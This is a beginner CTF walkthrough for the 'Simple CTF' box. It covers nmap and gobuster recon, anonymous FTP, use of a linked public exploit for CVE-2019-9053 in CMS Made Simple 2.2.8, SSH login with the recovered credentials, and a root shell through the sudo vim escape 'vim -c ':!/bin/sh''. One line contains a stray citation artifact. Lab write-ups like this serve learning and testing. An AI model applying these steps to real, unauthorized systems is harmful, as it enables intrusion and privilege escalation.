# Simple CTF Walkthrough

This was a fun beginner box that involved some web enumeration, exploiting a vulnerable CMS, and a simple privilege escalation using a misconfigured sudo permission.

## Recon

As usual, I started with an Nmap scan to see what was running on the target.

```bash
nmap -sV 10.113.139.247
```


![nmap scan](https://github.com/zackrage99/CTF/blob/main/images/Simple%20CTF/1.png)
The scan showed three open ports:

- **21** — FTP (`vsftpd 3.0.3`)
- **80** — Apache web server
- **22** — SSH

Since FTP allowed anonymous access sometimes, I decided to check that first.

---

## FTP Enumeration

I connected to FTP using:

```bash
ftp 10.113.139.247
```

Then logged in with:

```bash
Username: anonymous
Password: [Press Enter]
```

The login worked, but after poking around there wasn’t really anything useful there, so I moved on.

---

## Web Enumeration

Since the web server was running, I started directory brute forcing with Gobuster:

```bash
gobuster dir -u http://10.113.139.247 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
```


![gobuster](https://github.com/zackrage99/CTF/blob/main/images/Simple%20CTF/2.png)
One interesting result popped up:

```bash
/simple
```

Going to:

```bash
http://10.113.139.247/simple
```

showed a **CMS Made Simple** installation.

I spent a little time looking around the site and eventually identified the version as:

```bash
2.2.8
```


![cms version](https://github.com/zackrage99/CTF/blob/main/images/Simple%20CTF/3.png)

That was promising, so I searched for public exploits.

---

## Exploitation

A quick search for vulnerabilities affecting this version led me to:

**CVE-2019-9053**

I found a working exploit on GitHub:

https://github.com/Perseus99999/CVE-2019-9053-working-/blob/main/exploit.py

After running the exploit and letting it do its thing, it eventually returned credentials:

```bash
Username: mitch
Password: secret
```


![exploit](https://github.com/zackrage99/CTF/blob/main/images/Simple%20CTF/6.png)


Always a good day when an exploit gives you creds.

I tried them in the CMS admin panel first (`/simple/admin`), but didn’t find much interesting there.

Then I remembered SSH was open.

---


![admin panel](https://github.com/zackrage99/CTF/blob/main/images/Simple%20CTF/4.png)

## Initial Access

Tried the same credentials over SSH:

```bash
ssh mitch@10.113.139.247
```

Password:

```bash
secret
```

And… we’re in.

Sometimes credential reuse really is that easy.

---

## User Flag

After logging in, I checked the home directory:

```bash
ls
```

Saw the first flag:

```bash
user.txt
```

Read it:

```bash
cat user.txt
```

User flag captured.

---


![user flag](https://github.com/zackrage99/CTF/blob/main/images/Simple%20CTF/7.png)

## Privilege Escalation

Next step was checking what Mitch could run with sudo:

```bash
sudo -l
```

Interesting result:

```bash
(root) NOPASSWD: /usr/bin/vim
```

Being able to run Vim as root is basically game over.

I checked :contentReference[oaicite:0]{index=0} and used the Vim escape:

```bash
vim -c ':!/bin/sh'
```

That dropped me straight into a root shell.

Very nice.

---


![root](https://github.com/zackrage99/CTF/blob/main/images/Simple%20CTF/10.png)

## Root Flag

Once root, I moved into the root directory:

```bash
cd /root
ls
```

Found the final flag:

```bash
root.txt
```

Read it:

```bash
cat root.txt
```


![root flag](https://github.com/zackrage99/CTF/blob/main/images/Simple%20CTF/12.png)





